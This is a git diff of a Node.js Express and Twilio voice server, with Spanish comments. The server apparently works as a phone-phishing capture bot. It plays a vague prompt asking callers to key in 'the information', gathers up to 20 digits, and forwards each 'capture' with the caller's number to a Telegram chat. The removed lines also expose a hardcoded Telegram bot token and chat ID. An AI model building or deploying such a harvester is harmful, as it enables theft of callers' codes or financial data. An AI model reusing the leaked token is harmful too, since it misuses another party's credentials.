@@ -4,33 +4,54 @@ const axios = require('axios');
 const app = express();
 app.use(express.urlencoded({ extended: true }));
 
-const TELEGRAM_TOKEN = '7808638370:AAFH07f-wtu3LPC6jCKelIma40K5lekzYqM';
-const TELEGRAM_CHAT_ID = '-5520488233';
+// 1. Leemos las variables de Render
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// Cuando alguien llama
+// Revisar que sí estén
+if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
+  console.log("ERROR: Falta TELEGRAM_TOKEN o TELEGRAM_CHAT_ID en variables de Render");
+}
+
+// Cuando entra la llamada
 app.post('/voice', (req, res) => {
   const twiml = new twilio.twiml.VoiceResponse();
-  twiml.say({language: 'es-MX'}, 'Digite la información y presione numeral');
-  twiml.gather({ input: 'dtmf', action: '/resultado' });
+  twiml.say({language: 'es-MX', voice: 'Polly.Lucia'}, 'Digite la información y presione numeral');
+  twiml.gather({ 
+    input: 'dtmf',
+    timeout: 10,
+    numDigits: 20,
+    finishOnKey: '#',
+    action: '/resultado'
+  });
+  twiml.say({language: 'es-MX'}, 'No recibí datos. Adios');
+  twiml.hangup();
   res.type('text/xml');
   res.send(twiml.toString());
 });
 
-// Cuando marca
+// Cuando el usuario marca
 app.post('/resultado', async (req, res) => {
   const digits = req.body.Digits;
   const from = req.body.From;
-  const mensaje = `📞 Llamada\nDe: ${from}\nDatos: ${digits}`;
   
-  await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    chat_id: TELEGRAM_CHAT_ID,
-    text: mensaje
-  });
+  const mensaje = `📞 Nueva Captura\nDe: ${from}\nDatos: ${digits}`;
+  
+  try {
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: mensaje
+    });
+  } catch (error) {
+    console.log("Error enviando a Telegram:", error.message);
+  }
   
   const twiml = new twilio.twiml.VoiceResponse();
-  twiml.say({language: 'es-MX'}, 'Recibido');
+  twiml.say({language: 'es-MX', voice: 'Polly.Lucia'}, 'Información recibida. Gracias');
   twiml.hangup();
+  res.type('text/xml');
   res.send(twiml.toString());
 });
 
-app.listen(3000, () => console.log('Bot prendido en puerto 3000'));
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log('Bot corriendo en puerto', PORT));
